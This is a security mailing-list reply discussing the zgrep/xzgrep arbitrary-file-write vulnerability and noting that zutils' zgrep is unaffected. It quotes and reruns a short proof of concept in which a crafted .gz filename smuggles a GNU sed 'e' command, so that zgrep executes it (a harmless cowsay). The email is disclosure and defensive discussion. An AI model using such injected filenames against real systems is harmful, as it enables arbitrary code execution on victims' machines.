Received: (qmail 15740 invoked by uid 550); 8 Apr 2022 11:37:26 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3209 invoked from network); 8 Apr 2022 09:18:25 -0000
Date: Fri, 8 Apr 2022 11:18:12 +0200
From: Axel Beckert <abe@deuxchevaux.org>
To: oss-security@lists.openwall.com
Message-ID: <20220408091808.dlod7nw6qkkugck5@sym.noone.org>
Mail-Followup-To: oss-security@lists.openwall.com
References: <m2o81c3f8r.fsf@meyering.net>
 <20220408082329.o5ce7giuals7rd7h@jwilk.net>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="aniv2klzxp4xja4k"
Content-Disposition: inline
In-Reply-To: <20220408082329.o5ce7giuals7rd7h@jwilk.net>
X-Operating-System: Linux 4.9.0-18-amd64
X-Machine: sym2 x86_64
X-Editor: GNU Emacs 25.1.1
Face: iVBORw0KGgoAAAANSUhEUgAAADAAAAAwBAAAAAC3mUtaAAAABGdBTUEAALGPC/xhBQAAADh0RVh0U29mdHdhcmUAWFYgVmVyc2lvbiAzLjEwYSAgUmV2OiAxMi8yOS85NCAoUE5HIHBhdGNoIDEuMindFS5JAAACGElEQVQ4jXXQMU8UYRDG8f8shNjdDH4AbpfGDjAWlKiJiZ0ajL1aGCvsNCbGaCGG1koLaztaTYz6ATy+gOyehYmF3MxVxgg3FnDsHcTpJr/M+8w7Rf6nCsaVTTDqxbg9hoOXmw83H71+Eyfg4E1d7/Z2fG9rGkZbTQiu+K+3U/C+76lmkvAhJuDndnoAiftou4V84okAGclop4U/jYACZDTxrYWP0gkxVfAm/W//GLZpxIzwIN0Hn8dw0B+IWkZmQmRsj2HfhwokEklHfNCCiQCRgAR7YyhQVRVTCKCzP4Y5zBBE0t0zY3Q8oQaBqqAMlVEcgVQd9706zGirAFium8HXumlMIeMwqQCInju+2+uB6MRENupdpMt8pRlHZyuAW0F+Mb6XSIVqtxjD+iVmVqqystLEzFTGT92YqRaXpNT5eTVjeJhbALPnrTxLUZUKZsgxcNm64hAOYisT/xhF+oKTGU5RegtC3Rt6eEDi/QnIevdTx9Md2EMmYBRmCQR1026FCGQQJJExsRUqgkMGaWSbwYLnoO4T6VgpbQbdELPMBAHWWrhYrcxXnYgAsatPWygkFCBD4K62MAsOTqA6szYRPpsu6e6Y8mPiVrBMNuGIMrgwBUu4p2DgG1Ownu6hpuTv7hScefHAzAC/yRRw5U5pALMbJ4AUALvHSZhxgHPXTsHcdWD1GadAHr9avP+c0wCr7263Df8ASLwXWHWs+KIAAAAHdElNRQfYBQEBODPr
Organization: DeuxChevaux.org -- The =?iso-8859-1?Q?Citr?=
 =?iso-8859-1?B?b+tu?= 2CV Database
User-Agent: NeoMutt/20170113 (1.7.2)
Subject: Re: [oss-security] zgrep, xzgrep: arbitrary-file-write vulnerability

--aniv2klzxp4xja4k
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hi,

On Fri, Apr 08, 2022 at 10:23:29AM +0200, Jakub Wilk wrote:
> As mentioned in the xz patch, if you have GNU sed, you get not just file
> write, but direct code execution.

Ouch.

> PoC:
>=20
>    $ touch foo.gz
>    $ echo foo | gzip > "$(printf '|\n;e cowsay pwned\n#.gz')"
>    $ zgrep foo *.gz
>     _______
>    < pwned >
>     -------
>            \   ^__^
>             \  (oo)\_______
>                (__)\       )\/\
>                    ||----w |
>                    ||     ||
>    foo

JFTR, if you have replaced GNU's zgrep with zgrep from zutils
(https://www.nongnu.org/zutils/zutils.html; allows to use z* tools
with many compression formats, also mixed in a single command), then
this exploit does not work:

abe@c6:~/tmp/zgrep-PoC $ touch foo.gz
abe@c6:~/tmp/zgrep-PoC $ echo foo | gzip > "$(printf '|\n;e cowsay pwned\n#=
.gz')"
abe@c6:~/tmp/zgrep-PoC $ zgrep foo *.gz
|
;e cowsay pwned
#.gz:foo
abe@c6:~/tmp/zgrep-PoC $ zgrep.gzip foo *.gz
 _______
< pwned >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
foo
abe@c6:~/tmp/zgrep-PoC $ dpkg -S /bin/zgrep
diversion by zutils from: /bin/zgrep
diversion by zutils to: /bin/zgrep.gzip
gzip, zutils: /bin/zgrep
abe@c6:~/tmp/zgrep-PoC

		Kind regards, Axel
--=20
PGP: 2FF9CD59612616B5      /~\  Plain Text Ribbon Campaign, http://arc.pasp=
.de/
Mail: abe@deuxchevaux.org  \ /  Say No to HTML in E-Mail and Usenet
Mail+Jabber: abe@noone.org  X
https://axel.beckert.ch/   / \  I love long mails: https://email.is-not-s.m=
s/

--aniv2klzxp4xja4k
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEERoyJeTtCmBnp12Ema+Zjx1o1yXUFAmJP/coACgkQa+Zjx1o1
yXX4Xg/+Ps3xi+3xjUolWE3gio4/vfKj8b4EqEGH9nHYEdn17TE++RAqhoyaOE2w
B9/IFBiQZfLBGCfqEm1l8WgsdoqJE+vnl8nWkxsPSt1pAt9FL3p77XTifey9rOwK
+IpmocotaXhNb92X8CiTUphG7wIXOOIH8zGdXMmKCIwXLLmclYnfZsTVNZYQZD2+
lSAwb2HXZwPp7Oy7VhmBBsubLbc/2TsYkLFqR0LYAAKrcykMnMZBEXXYLwysrZND
gmHpcBFgt0aoPPeHyfOPlAz5EnzqU0xD9n/NgqMrZzsp0Su3NwTam3R0OfBL0UB0
+Wt7lglYclEbCAbCcIHdJpSpgTHyIYt5kC8hL2f8cTEhbaJ9qBXN5J8S9NUUCxWt
pbaOXBA9JwLCJ+FJciDImn47u6DuVzDJgVxTisFis5APkv2tja1CGCByDpYk+Q7C
7kWcy/Jyg/IWjbr4gTyDqhk6DKuJS4J4XPeBdBg/0chmQ/O4cVHpEaAilXd7TfMg
8Dip3Rpf4GECoxg6MoLqMCwxAewAzzCxxrcVy1oeH+LOMjSt6Si5VXFU1/nRPC90
VHY6Sl6lE7ZypALdUQ8hOkPc9hglwA1biHjptO6AOHTLEw+t5v+Fjl7wWGL7LB26
5AagTvifI69AY3TAS0GmQK7ORc+c915OfFu2H4TqsaV2YZ2ehyM=
=5YdB
-----END PGP SIGNATURE-----

--aniv2klzxp4xja4k--
